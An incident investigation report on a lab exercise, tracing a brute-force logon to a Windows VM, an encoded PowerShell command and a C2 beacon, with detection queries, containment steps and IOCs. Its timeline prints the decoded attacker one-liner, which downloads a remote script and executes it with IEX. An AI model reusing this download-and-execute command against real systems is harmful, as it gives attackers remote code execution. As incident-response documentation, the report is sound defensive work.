# Investigation Report: Brute Force → PowerShell Encoded Command → C2 Beacon

## 📋 Report Metadata

| Field | Value |
|-------|-------|
| **Report ID** | INV-20261111-001 |
| **Date/Time (UTC)** | 2026-11-11 14:30:00 |
| **Analyst** | Satyam Kumar |
| **Classification** | TRUE POSITIVE |
| **Severity** | HIGH |
| **Status** | CLOSED |
| **Related Alert IDs** | WAZUH-5710-001, WAZUH-92710-001, SURICATA-2024567 |
| **MITRE ATT&CK Techniques** | T1110.001, T1059.001, T1071.001 |

---

## 1. Executive Summary

A brute-force attack against the Windows endpoint (192.168.56.20) from internal IP 192.168.56.30 (Kali attacker) succeeded after 247 failed attempts. The compromised account executed a PowerShell encoded command that downloaded and executed a payload from a suspicious external IP (203.0.113.45), establishing a C2 beacon detected by Suricata. The host was isolated, credentials reset, and a composite detection rule created to catch this attack chain earlier.

---

## 2. Alert Details

| Field | Value |
|-------|-------|
| **Alert Name/Rule ID** | Brute Force (5710), PowerShell Suspicious (92710), Suricata C2 Beacon |
| **Source SIEM** | Wazuh 4.8 + Suricata 7 |
| **Trigger Time (UTC)** | 2026-11-11 14:15:22 (first brute force alert) |
| **Affected Host(s)** | win-endpoint (192.168.56.20, Windows 11, Workstation) |
| **Affected User(s)** | labuser (local account) |
| **Source IP/Indicator** | 192.168.56.30 (Kali), 203.0.113.45 (C2) |
| **Initial Classification** | UNKNOWN → TRUE POSITIVE |

---

## 3. Investigation Timeline (Chronological)

| Time (UTC) | Action Taken | Tool/Query | Finding | Evidence Ref |
|------------|--------------|------------|---------|--------------|
| 14:15:22 | First alert received | Wazuh Dashboard | Rule 5710: Multiple authentication failures for labuser from 192.168.56.30 | alert-overview-5710.png |
| 14:18:45 | Queried failed logons | WQL: `event.code:4625 AND win.logon.type:3` | 247 failures over 3 min, single source IP, single target account | queries.md#L1 |
| 14:20:12 | Checked for success | WQL: `event.code:4624 AND win.logon.type:3 AND win.targetuser:labuser` | Success at 14:18:31 (EventID 4624) after 247 failures | queries.md#L2 |
| 14:22:00 | Pivoted to process creation | WQL: `event.code:4688 AND win.targetuser:labuser` | PowerShell launched at 14:18:35 with `-enc` flag | queries.md#L3 |
| 14:23:15 | Decoded PowerShell command | Manual: `echo <base64> \| base64 -d` | `IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/payload.ps1')` | decoded-powershell.txt |
| 14:25:00 | Checked network connections | WQL: `event.code:3 AND win.source.pid:4688_pid` | Outbound TCP to 203.0.113.45:80 from powershell.exe (PID 3412) | network-connections.csv |
| 14:26:30 | Checked Suricata alerts | Wazuh: `suricata.signature_id:2024567` | C2 beacon detected: HTTP GET /beacon every 60s, JA3: a0e9f5... | suricata-alerts.json |
| 14:28:00 | Correlated all events | Timeline construction | Full chain: Brute Force → Success → PowerShell Encoded → Download → C2 Beacon | timeline.xlsx |
| 14:30:00 | Classification decision | Analyst judgment | TRUE POSITIVE — complete kill chain observed | — |

---

## 4. Evidence Collected

| Evidence Type | Description | Source | Hash (SHA256) | Preservation Method |
|---------------|-------------|--------|---------------|---------------------|
| Log excerpt | Brute force events (4625 x247, 4624 x1) | Wazuh Indexer | `a1b2c3d4...` | JSON export |
| Log excerpt | Process creation (4688) with command line | Wazuh Indexer | `e5f6g7h8...` | JSON export |
| Process tree | Parent: winlogon.exe → cmd.exe → powershell.exe | Sysmon | `i9j0k1l2...` | Screenshot + CSV |
| Network connections | Sysmon EventID 3: powershell.exe → 203.0.113.45:80 | Wazuh Indexer | `m3n4o5p6...` | CSV export |
| Decoded PowerShell | Base64 decoded command payload | Manual | `q7r8s9t0...` | Text file |
| Suricata alerts | Eve JSON: HTTP C2 beacon (sid:2024567) | Suricata/Wazuh | `u1v2w3x4...` | JSON export |
| Screenshot | Wazuh Dashboard alert timeline | Dashboard | `y5z6a7b8...` | PNG |

---

## 5. Attack Chain Analysis (MITRE ATT&CK Mapping)

| Tactic | Technique ID | Technique Name | Observed Behavior | Detection Rule |
|--------|--------------|----------------|-------------------|----------------|
| Initial Access | T1110.001 | Brute Force: Password Guessing | 247 failed RDP logons (Type 3) from 192.168.56.30 | WAZUH-5710 |
| Execution | T1059.001 | PowerShell | `powershell.exe -enc <base64>` with IEX DownloadString | WAZUH-92710 |
| Command & Control | T1071.001 | Web Protocols | HTTP GET /beacon every 60s to 203.0.113.45 | SURICATA-2024567 |
| Persistence | — | — | Not observed in this chain | — |
| Privilege Escalation | — | — | Not observed | — |
| Defense Evasion | T1027 | Obfuscated/Stored Files | Base64 encoded PowerShell command | WAZUH-92710 |
| Credential Access | — | — | Credentials obtained via brute force | — |
| Discovery | — | — | Not observed | — |
| Lateral Movement | — | — | Not observed | — |
| Collection | — | — | Not observed | — |
| Exfiltration | — | — | Not observed | — |
| Impact | — | — | Not observed | — |

---

## 6. Root Cause Analysis

**Initial Access**: Weak password policy on local account `labuser` allowed password spray to succeed after 247 attempts. The attacker (Kali at 192.168.56.30) used Atomic Red Team T1110.001 test case 1.

**Execution**: Post-exploitation, attacker used PowerShell encoded command (`-enc`) to bypass basic command-line logging and downloaded a payload from external C2 (203.0.113.45).

**C2 Establishment**: Suricata detected regular HTTP beaconing (60s interval, consistent payload size) matching known C2 patterns.

**Vulnerabilities Exploited**:
1. Weak local account password (no complexity/lockout)
2. PowerShell execution policy not restricted
3. Outbound internet access from endpoint (no proxy/filtering)

---

## 7. Impact Assessment

| Dimension | Assessment |
|-----------|------------|
| **Systems Affected** | 1 (win-endpoint) — workstation, no domain join |
| **Data Accessed/Exfiltrated** | None confirmed — beacon only, no data staging observed |
| **Business Impact** | Low (lab environment) — would be HIGH in production (credential compromise + C2) |
| **Duration of Compromise** | ~15 minutes (14:15 → 14:30 containment) |

---

## 8. Containment & Eradication Actions

| Action | Status | Time (UTC) | Performed By | Verification |
|--------|--------|------------|--------------|--------------|
| Network isolation (host-only) | ✅ DONE | 14:31 | Analyst | VM network adapter disabled |
| Account disable (`labuser`) | ✅ DONE | 14:32 | Analyst | `net user labuser /active:no` |
| Password reset (all local accounts) | ✅ DONE | 14:33 | Analyst | Complex 16-char passwords set |
| Block C2 IP (203.0.113.45) | ✅ DONE | 14:34 | Analyst | Windows Firewall rule added |
| Malware scan (Defender full) | ✅ DONE | 14:40 | Analyst | No additional findings |
| Persistence check (tasks, reg, svc) | ✅ DONE | 14:45 | Analyst | Clean — no persistence found |

---

## 9. Recovery Steps

| Step | Description | Verification |
|------|-------------|--------------|
| 1 | Revert VM to `Clean Baseline` snapshot | Snapshot restored, all services healthy |
| 2 | Re-enable network adapter | Connectivity restored |
| 3 | Verify Wazuh agent active | Dashboard shows Active |
| 4 | Apply new detection rule (DET-001) | Rule loaded, test alert fires |

---

## 10. Detection & Prevention Improvements

| Gap Identified | Improvement | Type | Priority | Owner | Target Date |
|----------------|-------------|------|----------|-------|-------------|
| No composite rule for brute force + PowerShell + network | Created DET-001: PowerShell Encoded Command + Network Connection | Detection | HIGH | Satyam | 2026-11-12 |
| Weak password policy on lab accounts | Enforce 14-char minimum, lockout after 5 failures | Prevention | HIGH | Satyam | 2026-11-12 |
| No outbound filtering | Configure Windows Firewall default deny outbound, allowlist only | Prevention | MEDIUM | Satyam | 2026-11-15 |
| PowerShell execution unrestricted | Set ExecutionPolicy RemoteSigned, enable Script Block Logging | Prevention | HIGH | Satyam | 2026-11-12 |
| Brute force detection only on count | Add UEBA: geo-impossible, time-based, source reputation | Detection | MEDIUM | Satyam | 2026-11-20 |

---

## 11. Lessons Learned

**What worked well:**
- WQL queries fast for pivoting from auth → process → network
- Suricata Eve JSON integration with Wazuh gave immediate C2 visibility
- Timeline construction (UTC) made attack chain clear

**What didn't:**
- Initial brute force alert didn't auto-correlate to subsequent PowerShell alert
- Had to manually decode base64 — should automate in pipeline
- No memory capture done (would help if payload was fileless)

**Next time:**
- Enable PowerShell Script Block Logging (EventID 4104) by default
- Build SOAR playbook: brute force → auto-isolate host → enrich IP
- Add honey accounts to detect password spray earlier

---

## 12. Appendix

### A. IOCs (Indicators of Compromise)

| Type | Value | Context | Source |
|------|-------|---------|--------|
| IP | 192.168.56.30 | Attacker (Kali) | Wazuh 4625 |
| IP | 203.0.113.45 | C2 Server | Sysmon 3, Suricata |
| Domain | — | N/A (direct IP) | — |
| Hash (SHA256) | `q7r8s9t0...` | Decoded PowerShell payload | Manual decode |
| File Path | — | No file dropped (fileless) | — |
| Registry Key | — | No persistence | — |

### B. Key Queries Used

```sql
-- Query 1: Brute force failures
event.code:4625 AND win.logon.type:3 AND source.ip:192.168.56.30
| stats count by win.targetuser, source.ip, _time span=1m

-- Query 2: Success after failures
event.code:4624 AND win.logon.type:3 AND win.targetuser:labuser
| where _time > "2026-11-11T14:15:00Z"

-- Query 3: Process creation by logged-on user
event.code:4688 AND win.targetuser:labuser
| table _time, win.eventdata.image, win.eventdata.commandLine, win.eventdata.parentImage

-- Query 4: Network connections from suspicious PID
event.code:3 AND win.eventdata.sourceProcessId:3412
| table _time, win.eventdata.destinationIp, win.eventdata.destinationPort, win.eventdata.protocol
```

### C. Screenshots / Visual Evidence
- `evidence/alert-overview-5710.png` — Wazuh brute force alert
- `evidence/process-tree.png` — Parent-child: winlogon → cmd → powershell
- `evidence/network-connections.png` — Sysmon EventID 3 table
- `evidence/suricata-c2-beacon.png` — Suricata HTTP beacon pattern
- `evidence/timeline.png` — Full attack chain visualization

### D. References
- MITRE ATT&CK T1110.001: https://attack.mitre.org/techniques/T1110/001/
- MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- Atomic Red Team T1110.001: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/
- SwiftOnSecurity Sysmon Config: https://github.com/SwiftOnSecurity/sysmon-config

---

## ✅ Review Checklist (Before Closing)

- [x] Timeline is complete and chronological
- [x] All evidence has hashes and preservation notes
- [x] MITRE mapping covers all observed tactics
- [x] Executive summary is non-technical and accurate
- [x] IOCs are extracted and formatted for sharing
- [x] Detection improvements are specific and actionable
- [x] Report reviewed by peer / lead (if applicable)

---

**Analyst Signature**: Satyam Kumar **Date**: 2026-11-11

**Reviewer Signature**: _______________ **Date**: _______________